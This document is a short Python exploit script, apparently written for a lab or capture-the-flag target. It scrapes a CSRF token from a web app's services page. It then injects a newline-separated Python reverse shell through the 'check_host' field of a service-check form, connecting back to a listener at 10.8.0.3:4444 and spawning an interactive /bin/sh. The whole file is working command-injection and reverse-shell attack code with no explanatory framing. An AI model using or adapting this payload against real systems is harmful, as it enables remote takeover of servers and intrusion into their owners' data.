
#!/usr/bin/env python3
import requests
import re

TARGET_URL = "http://127.0.0.1:9124"
LHOST = "10.8.0.3"
LPORT = "4444"

# Build the reverse shell command
reverse_shell_cmd = (
    "python3 -c 'import socket,subprocess,os\n"
    f's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n'
    f's.connect(("{LHOST}",{LPORT}))\n'
    "os.dup2(s.fileno(),0)\n"
    "os.dup2(s.fileno(),1)\n"
    "os.dup2(s.fileno(),2)\n"
    'subprocess.call(["/bin/sh","-i"])\''
)

# Inject the command through the host field
payload_host = "127.0.0.1\n" + reverse_shell_cmd

s = requests.Session()

# Get the CSRF token
r = s.get(f"{TARGET_URL}/services")
token = re.search(
    r'name="csrf_token" value="([^"]+)"', r.text
).group(1)

# Prepare the request data
data = {
    "csrf_token": token,
    "label": "lala",
    "check_host": payload_host,
    "check_port": "80",
}

# Send the payload and display the response
try:
    r = s.post(
        f"{TARGET_URL}/services/check",
        data=data,
        timeout=10
    )
    print(r.text[:600])

except requests.exceptions.Timeout:
    print("Request timed out; check your listener.")
